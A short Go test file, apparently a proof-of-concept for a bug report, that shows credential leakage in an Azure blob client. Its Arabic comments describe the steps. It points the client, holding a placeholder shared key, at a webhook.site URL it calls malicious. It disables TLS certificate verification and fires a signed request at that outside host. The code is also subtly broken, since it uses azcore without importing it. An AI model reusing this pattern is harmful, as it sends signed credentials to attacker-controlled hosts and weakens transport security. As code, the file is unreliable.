package azblob

import (
	"context"
	"testing"
	"crypto/tls"
	"net/http"
)

func TestImpact_CredentialLeakage(t *testing.T) {
	attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835"
	
	// استخدام ترانسپورت يتجاهل الـ SSL لضمان عدم توقف الطلب
	customTransport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	customClient := &http.Client{Transport: customTransport}

	cred, _ := NewSharedKeyCredential("victim_account", "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg==")

	// تمرير العميل المخصص مع الرابط الخبيث
	options := &ClientOptions{
		ClientOptions: azcore.ClientOptions{
			Transport: customClient,
		},
	}

	client, _ := NewClientWithSharedKeyCredential(attackerURL, cred, options)

	// الدالة القاضية: ترسل طلب GET فوراً للرابط
	t.Log("Sending Forced Request...")
	_, err := client.GetProperties(context.Background(), nil)
	
	if err != nil {
		t.Logf("Expected error (since it's a webhook): %v", err)
	}
}
